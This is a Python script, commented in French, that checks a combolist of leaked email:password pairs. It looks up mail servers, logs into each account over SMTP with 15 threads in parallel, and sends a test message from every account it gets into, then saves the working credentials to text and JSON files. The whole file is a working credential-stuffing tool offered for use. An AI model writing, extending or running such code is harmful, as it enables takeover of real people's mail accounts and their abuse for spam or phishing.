import dns.resolver
import smtplib
import socket
import re
from email.mime.text import MIMEText
import sys
from concurrent.futures import ThreadPoolExecutor
import threading
import json
from datetime import datetime
from functools import lru_cache
import time

# Timeout global (2 secondes)
TIMEOUT = 2

# Liste des ports SMTP à tester
SMTP_PORTS = [25, 465, 587, 2525]

# Dictionnaire étendu des services de messagerie
EMAIL_SERVICES = {
    'gmail.com': {'smtp': 'smtp.gmail.com', 'ports': [587, 465], 'mx_patterns': ['google.com', 'googlemail.com']},
    'yahoo.com': {'smtp': 'smtp.mail.yahoo.com', 'ports': [587, 465], 'mx_patterns': ['yahoo.com', 'yahoodns.net']},
    'outlook.com': {'smtp': 'smtp-mail.outlook.com', 'ports': [587], 'mx_patterns': ['outlook.com', 'hotmail.com', 'live.com']},
    'hotmail.com': {'smtp': 'smtp-mail.outlook.com', 'ports': [587], 'mx_patterns': ['outlook.com', 'hotmail.com', 'live.com']},
    'live.com': {'smtp': 'smtp-mail.outlook.com', 'ports': [587], 'mx_patterns': ['outlook.com', 'hotmail.com', 'live.com']},
    'aol.com': {'smtp': 'smtp.aol.com', 'ports': [587, 465], 'mx_patterns': ['aol.com']},
    'icloud.com': {'smtp': 'smtp.mail.me.com', 'ports': [587], 'mx_patterns': ['icloud.com', 'me.com']},
    'protonmail.com': {'smtp': 'mail.protonmail.com', 'ports': [587], 'mx_patterns': ['protonmail.com', 'proton.me']},
    'zoho.com': {'smtp': 'smtp.zoho.com', 'ports': [587, 465], 'mx_patterns': ['zoho.com']},
    'gmx.com': {'smtp': 'smtp.gmx.com', 'ports': [587, 465], 'mx_patterns': ['gmx.com']},
    'mail.com': {'smtp': 'smtp.mail.com', 'ports': [587, 465], 'mx_patterns': ['mail.com']},
    'yandex.com': {'smtp': 'smtp.yandex.com', 'ports': [587, 465], 'mx_patterns': ['yandex.com', 'yandex.ru']},
    'qq.com': {'smtp': 'smtp.qq.com', 'ports': [587, 465], 'mx_patterns': ['qq.com']},
    '163.com': {'smtp': 'smtp.163.com', 'ports': [587, 465], 'mx_patterns': ['163.com', 'netease.com']},
    'sina.com': {'smtp': 'smtp.sina.com', 'ports': [587, 465], 'mx_patterns': ['sina.com']},
    'naver.com': {'smtp': 'smtp.naver.com', 'ports': [587], 'mx_patterns': ['naver.com']},
    'seznam.cz': {'smtp': 'smtp.seznam.cz', 'ports': [587], 'mx_patterns': ['seznam.cz']},
    'wp.pl': {'smtp': 'smtp.wp.pl', 'ports': [587, 465], 'mx_patterns': ['wp.pl']},
    'orange.fr': {'smtp': 'smtp.orange.fr', 'ports': [587], 'mx_patterns': ['orange.fr', 'wanadoo.fr']},
    'free.fr': {'smtp': 'smtp.free.fr', 'ports': [587], 'mx_patterns': ['free.fr']},
    'sfr.fr': {'smtp': 'smtp.sfr.fr', 'ports': [587], 'mx_patterns': ['sfr.fr', 'numericable.fr', 'noos.fr']},
    'laposte.net': {'smtp': 'smtp.laposte.net', 'ports': [587, 465], 'mx_patterns': ['laposte.net']},
    'bluewin.ch': {'smtp': 'smtpauth.bluewin.ch', 'ports': [587], 'mx_patterns': ['bluewin.ch', 'swisscom.ch']},
    't-online.de': {'smtp': 'securesmtp.t-online.de', 'ports': [587, 465], 'mx_patterns': ['t-online.de']},
    'web.de': {'smtp': 'smtp.web.de', 'ports': [587, 465], 'mx_patterns': ['web.de']},
    'mail.ru': {'smtp': 'smtp.mail.ru', 'ports': [587, 465], 'mx_patterns': ['mail.ru']},
    'rambler.ru': {'smtp': 'smtp.rambler.ru', 'ports': [587], 'mx_patterns': ['rambler.ru']},
    'rediffmail.com': {'smtp': 'smtp.rediffmail.com', 'ports': [587], 'mx_patterns': ['rediffmail.com']},
    'comcast.net': {'smtp': 'smtp.comcast.net', 'ports': [587], 'mx_patterns': ['comcast.net']},
    'att.net': {'smtp': 'smtp.mail.att.net', 'ports': [587, 465], 'mx_patterns': ['att.net', 'sbcglobal.net']},
    'verizon.net': {'smtp': 'smtp.verizon.net', 'ports': [587, 465], 'mx_patterns': ['verizon.net']},
    'btinternet.com': {'smtp': 'mail.btinternet.com', 'ports': [587], 'mx_patterns': ['btinternet.com', 'bt.com']},
    'sky.com': {'smtp': 'smtp.tools.sky.com', 'ports': [587], 'mx_patterns': ['sky.com']},
    'shaw.ca': {'smtp': 'smtp.shaw.ca', 'ports': [587], 'mx_patterns': ['shaw.ca']},
    'rogers.com': {'smtp': 'smtp.rogers.com', 'ports': [587], 'mx_patterns': ['rogers.com']},
    'telus.net': {'smtp': 'smtp.telus.net', 'ports': [587], 'mx_patterns': ['telus.net']},
    'bell.net': {'smtp': 'smtp.bell.net', 'ports': [587], 'mx_patterns': ['bell.net', 'sympatico.ca']},
    'dbmail.com': {'smtp': 'smtp-mail.outlook.com', 'ports': [587], 'mx_patterns': ['dbmail.com', 'hotmail.com']},
    'fastmail.com': {'smtp': 'smtp.fastmail.com', 'ports': [587, 465], 'mx_patterns': ['fastmail.com', 'messagingengine.com']},
    'tutanota.com': {'smtp': 'smtp.tutanota.com', 'ports': [587], 'mx_patterns': ['tutanota.com']},
    'runbox.com': {'smtp': 'smtp.runbox.com', 'ports': [587], 'mx_patterns': ['runbox.com']},
    'hushmail.com': {'smtp': 'smtp.hushmail.com', 'ports': [587, 465], 'mx_patterns': ['hushmail.com']},
    'o2.pl': {'smtp': 'smtp.o2.pl', 'ports': [587], 'mx_patterns': ['o2.pl']},
    'interia.pl': {'smtp': 'smtp.poczta.interia.pl', 'ports': [587], 'mx_patterns': ['interia.pl']},
    'libero.it': {'smtp': 'smtp.libero.it', 'ports': [587, 465], 'mx_patterns': ['libero.it']},
    'virgilio.it': {'smtp': 'smtp.virgilio.it', 'ports': [587], 'mx_patterns': ['virgilio.it']},
    'tiscali.it': {'smtp': 'smtp.tiscali.it', 'ports': [587], 'mx_patterns': ['tiscali.it']},
    'mailfence.com': {'smtp': 'smtp.mailfence.com', 'ports': [587], 'mx_patterns': ['mailfence.com']},
    'riseup.net': {'smtp': 'smtp.riseup.net', 'ports': [587, 465], 'mx_patterns': ['riseup.net']},
    'mailjet.com': {'smtp': 'in.mailjet.com', 'ports': [587, 2525], 'mx_patterns': ['mailjet.com']},
    'sendgrid.net': {'smtp': 'smtp.sendgrid.net', 'ports': [587, 2525], 'mx_patterns': ['sendgrid.net', 'sendgrid.com']},
    'postmarkapp.com': {'smtp': 'smtp.postmarkapp.com', 'ports': [587, 2525], 'mx_patterns': ['postmarkapp.com']},
}

# Cache pour les enregistrements MX
@lru_cache(maxsize=1000)
def get_mx_records(domain):
    """Récupère les enregistrements MX avec cache, timeout de 2s et 1 réessai."""
    for attempt in range(2):  # 1 tentative + 1 réessai
        try:
            resolver = dns.resolver.Resolver()
            resolver.timeout = TIMEOUT
            resolver.lifetime = TIMEOUT
            answers = resolver.resolve(domain, 'MX')
            mx_records = [str(rdata.exchange).rstrip('.') for rdata in answers]
            return mx_records if mx_records else ["Aucun MX trouvé"]
        except (dns.resolver.Timeout, dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            if attempt == 0:
                continue
            return [f"Erreur MX: Timeout ou domaine introuvable"]
        except Exception as e:
            if attempt == 0:
                continue
            return [f"Erreur MX: {str(e)}"]

def guess_smtp_server(domain, mx_records):
    """Devine le serveur SMTP basé sur le domaine et les MX avec validation stricte."""
    domain = domain.lower()
    
    # Vérifie si le domaine correspond à un service connu
    for known_domain, info in EMAIL_SERVICES.items():
        if domain.endswith(known_domain):
            return info['smtp'], info['ports']
    
    # Vérifie les MX pour une correspondance avec les motifs
    for mx in mx_records:
        if mx.startswith("Erreur") or mx == "Aucun MX trouvé":
            continue
        for known_domain, info in EMAIL_SERVICES.items():
            for pattern in info['mx_patterns']:
                if pattern in mx.lower():
                    return info['smtp'], info['ports']
    
    # Fallback : retourne tous les MX valides comme serveurs SMTP potentiels
    valid_mx = [mx for mx in mx_records if not mx.startswith("Erreur") and mx != "Aucun MX trouvé"]
    return valid_mx if valid_mx else None, SMTP_PORTS

def test_smtp_connection(smtp_server, port, email, password):
    """Teste la connexion SMTP avec timeout de 2s et 1 réessai."""
    for attempt in range(2):  # 1 tentative + 1 réessai
        try:
            if port == 465:
                server = smtplib.SMTP_SSL(smtp_server, port, timeout=TIMEOUT)
            else:
                server = smtplib.SMTP(smtp_server, port, timeout=TIMEOUT)
                server.starttls()
            server.login(email, password)
            server.quit()
            return True, f"Connexion SMTP réussie (port {port})"
        except socket.timeout:
            if attempt == 0:
                continue
            return False, f"Échec connexion: Timeout ({TIMEOUT}s) sur port {port}"
        except smtplib.SMTPAuthenticationError:
            return False, f"Échec connexion: Authentification échouée sur port {port}"
        except Exception as e:
            if attempt == 0:
                continue
            return False, f"Échec connexion: {str(e)} sur port {port}"

def send_test_email(smtp_server, port, email, password, recipient):
    """Envoie un email de test avec timeout de 2s et 1 réessai."""
    for attempt in range(2):  # 1 tentative + 1 réessai
        try:
            msg = MIMEText("Ceci est un email de test envoyé par le script SMTP checker corrigé.")
            msg['Subject'] = "Test Email"
            msg['From'] = email
            msg['To'] = recipient

            if port == 465:
                server = smtplib.SMTP_SSL(smtp_server, port, timeout=TIMEOUT)
            else:
                server = smtplib.SMTP(smtp_server, port, timeout=TIMEOUT)
                server.starttls()
            server.login(email, password)
            server.sendmail(email, recipient, msg.as_string())
            server.quit()
            return True, "Email de test envoyé avec succès"
        except socket.timeout:
            if attempt == 0:
                continue
            return False, f"Échec envoi email: Timeout ({TIMEOUT}s)"
        except smtplib.SMTPAuthenticationError:
            return False, "Échec envoi email: Authentification échouée"
        except Exception as e:
            if attempt == 0:
                continue
            return False, f"Échec envoi email: {str(e)}"

def is_valid_email(email):
    """Vérifie si l'email est valide (syntaxe stricte)."""
    email_regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(email_regex, email) is not None

def process_email(line, test_recipient):
    """Traite une ligne de la combolist (email:pass)."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = line.strip()
    if not line or ':' not in line:
        return {'email': line, 'result': 'Ligne invalide (vide ou sans :)', 'timestamp': timestamp}

    try:
        email, password = line.split(':', 1)
    except ValueError:
        return {'email': line, 'result': 'Format invalide (manque :)', 'timestamp': timestamp}

    if not is_valid_email(email):
        return {'email': email, 'result': 'Email invalide', 'timestamp': timestamp}

    domain = email.split('@')[1].lower()
    mx_records = get_mx_records(domain)
    smtp_servers, ports = guess_smtp_server(domain, mx_records)

    if not smtp_servers:
        return {'email': email, 'result': f"MX={mx_records}, Aucun serveur SMTP trouvé", 'timestamp': timestamp}

    result = f"MX={mx_records}"
    success = False
    send_result = ""

    # Si smtp_servers est une liste (cas fallback), tester chaque MX
    if isinstance(smtp_servers, list):
        for smtp_server in smtp_servers:
            result += f"\nSMTP={smtp_server}, Ports={ports}"
            for port in ports:
                success, message = test_smtp_connection(smtp_server, port, email, password)
                result += f"\n  Port {port}: {message}"
                if success:
                    send_success, send_message = send_test_email(smtp_server, port, email, password, test_recipient)
                    send_result = f"\n  Envoi test à {test_recipient}: {send_message}"
                    break
            if success:
                break
    else:
        # Cas où un serveur SMTP spécifique est identifié
        result += f"\nSMTP={smtp_servers}, Ports={ports}"
        for port in ports:
            success, message = test_smtp_connection(smtp_servers, port, email, password)
            result += f"\n  Port {port}: {message}"
            if success:
                send_success, send_message = send_test_email(smtp_servers, port, email, password, test_recipient)
                send_result = f"\n  Envoi test à {test_recipient}: {send_message}"
                break

    return {'email': email, 'result': result + send_result, 'timestamp': timestamp}

def process_combolist(file_path, test_recipient):
    """Traite la combolist avec multi-threading (15 threads)."""
    results = []
    lines = []
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            lines = file.readlines()
    except FileNotFoundError:
        return [{'email': 'N/A', 'result': 'Erreur: Fichier combolist introuvable', 'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")}]
    except UnicodeDecodeError:
        return [{'email': 'N/A', 'result': 'Erreur: Encodage du fichier invalide (attendu UTF-8)', 'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")}]
    except Exception as e:
        return [{'email': 'N/A', 'result': f"Erreur générale: {str(e)}", 'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")}]

    print(f"[INFO] Début du traitement de {len(lines)} lignes avec 15 threads...")

    # Utilisation de ThreadPoolExecutor avec 15 threads
    with ThreadPoolExecutor(max_workers=15) as executor:
        future_to_line = {executor.submit(process_email, line, test_recipient): line for line in lines}
        for future in future_to_line:
            try:
                result = future.result()
                results.append(result)
                # Affichage en temps réel pour montrer que le script progresse
                print(f"[INFO] {result['timestamp']} - {result['email']}: Traitement terminé")
            except Exception as e:
                results.append({'email': future_to_line[future], 'result': f"Erreur thread: {str(e)}", 'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")})

    return results

def main():
    # Demander le chemin du fichier combolist
    file_path = input("Entrez le chemin du fichier combolist (mail:pass): ")
    # Demander l'adresse email de test
    test_recipient = input("Entrez l'adresse email pour l'envoi de test: ")

    if not is_valid_email(test_recipient):
        print("Erreur: Adresse email de test invalide")
        return

    # Traiter la combolist
    start_time = time.time()
    results = process_combolist(file_path, test_recipient)
    elapsed_time = time.time() - start_time

    # Afficher les résultats
    lock = threading.Lock()
    with lock:
        print(f"\n[INFO] Traitement terminé en {elapsed_time:.2f} secondes")
        for result in results:
            print(f"[{result['timestamp']}] {result['email']}:\n{result['result']}\n{'-' * 50}")

        # Sauvegarder les résultats en texte
        with open('smtp_check_results.txt', 'w', encoding='utf-8') as f:
            for result in results:
                f.write(f"[{result['timestamp']}] {result['email']}:\n{result['result']}\n{'-' * 50}\n")

        # Sauvegarder les résultats en JSON
        with open('smtp_check_results.json', 'w', encoding='utf-8') as f:
            json.dump(results, f, ensure_ascii=False, indent=2)

if __name__ == "__main__":
    main()